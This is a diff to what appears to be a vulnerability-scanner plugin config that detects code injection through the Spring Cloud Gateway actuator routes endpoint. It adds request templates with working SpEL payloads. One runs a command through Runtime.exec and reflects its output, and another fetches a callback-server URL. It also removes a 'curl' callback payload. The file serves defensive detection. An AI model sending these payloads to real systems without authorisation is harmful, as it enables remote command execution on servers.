@@ -49,11 +49,31 @@ config: {}
 # No fingerprint because it doesn't appear to be easily fingerprintable. None in the original plugin.
 
 actions: {
-  name: "create_router"
+  name: "create_router_reflective"
   http_request: {
     method: POST
     uri: "/actuator/gateway/routes/{{ T_UTL_CURRENT_TIMESTAMP_MS }}"
     data: '{"id":"{{ T_UTL_CURRENT_TIMESTAMP_MS }}","filters":[{"name":"AddResponseHeader","args":{"name":"Result=","value":"#{new String(T(org.springframework.util.StreamUtils).copyToByteArray(T(java.lang.Runtime).getRuntime().exec(\\\"{{ PAYLOAD }}\\\").getInputStream()))}"}}],"uri":"http://localhost"}'
+    headers: [
+      { name: "Content-Type" value: "application/json" }
+    ]
+    response: {
+      http_status: 201
+    }
+  }
+  cleanup_actions: ["delete_router", "refresh"]
+}
+
+actions: {
+  name: "create_router_oob"
+  http_request: {
+    method: POST
+    uri: "/actuator/gateway/routes/{{ T_UTL_CURRENT_TIMESTAMP_MS }}"
+    data: 
+      '{"id":"{{ T_UTL_CURRENT_TIMESTAMP_MS }}","filters":[{"name":"AddResponseHeader"'
+      ',"args":{"name":"Result=","value":"#{new String(T(org.springframework.util.Stre'
+      'amUtils).copyToByteArray(new java.net.URL(\'{{ T_CBS_URI }}\').openStream()))}"'
+      '}}],"uri":"http://localhost"}'
     headers: [
       { name: "Content-Type" value: "application/json" }
     ]
@@ -127,11 +147,8 @@ actions: {
 
 workflows: {
   condition: REQUIRES_CALLBACK_SERVER
-  variables: [
-    { name: "PAYLOAD" value: "curl {{ T_CBS_URI }}"}
-  ]
   actions: [
-    "create_router",
+    "create_router_oob",
     "refresh",
     "get_router_oob",
     "sleep",
@@ -147,7 +164,7 @@ workflows: {
     { name: "PAYLOAD" value: "printf %x 133713371337"}
   ]
   actions: [
-    "create_router",
+    "create_router_reflective",
     "refresh",
     "get_router_reflective"
   ]
